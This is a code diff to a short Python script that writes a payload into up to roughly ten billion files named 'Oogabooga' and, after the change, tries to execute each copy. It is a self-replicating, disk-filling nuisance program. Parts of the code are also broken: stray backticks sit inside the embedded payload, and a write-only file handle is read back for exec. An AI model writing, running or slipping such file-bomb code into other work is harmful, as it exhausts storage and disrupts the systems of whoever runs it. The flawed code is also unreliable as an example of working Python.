@@ -16,8 +16,22 @@ import sys
 path = "/"
 path2 = "C:"
 f = open("pac.txt", "r")
-the_package = f.read() * 99
+the_package = """
+import os
+import sys
+
+path = "/"
+path2 = "C:"
+f = open("pac.txt", "r")
+the_package = f.read() * `99`
 
 for i in range(1,9999999999):
     with open(f"Oogabooga{i}.py", 'w') as file:
         file.write(the_package)
+
+"""
+
+for i in range(1,9999999999):
+    with open(f"Oogabooga{i}.py", 'w') as file:
+        file.write(the_package)
+        exec(file.read())
